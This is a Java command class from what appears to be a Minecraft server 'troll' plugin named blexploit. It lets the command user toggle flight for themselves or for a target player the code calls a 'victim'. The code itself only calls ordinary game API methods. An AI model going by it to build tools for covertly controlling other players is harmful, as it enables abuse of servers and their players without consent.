package de.blexploit.command.cmds;

import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.command.Command;
import de.blexploit.manager.TabManager;
import de.blexploit.players.create.MittrollerEntity;

public final class Fly extends Command {

	public Fly() {
		super("fly", "Ändert den Flugmodus von einem Spieler", TabManager.INSERT_PLAYERNAME);
	}

	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length == 1) {
			flyChanger(mt.getPlayer(), mt);
		}
		if (args.length > 1) {
			Player victim = api.Get.victim(args, 1);
			if (victim != null) {
				flyChanger(victim, mt);
			} else {
				mt.fehler(Fehler.PLAYER_NOT_FOUND);
			}
		}
	}

	private void flyChanger(Player p, MittrollerEntity mt) {
		if (p.getAllowFlight()) {
			if (mt.getPlayer().equals(p)) {
				mt.sendMessage("Dein fliegen wurde §cdeaktiviert!");
			} else {
				this.SpielerInfo(mt, "hat das fliegen von §c" + p.getName() + this.CHAT_COLOR + " deaktiviert.");
			}
			p.setAllowFlight(false);
			p.setFlying(false);
		} else {
			if (mt.getPlayer().equals(p)) {
				mt.sendMessage("Dein fliegen wurde §aaktiviert!");
			} else {
				this.SpielerInfo(mt, "hat das fliegen von §c" + p.getName() + this.CHAT_COLOR + " aktiviert.");
			}
			p.setAllowFlight(true);
			p.setFlying(true);
		}
	}

}
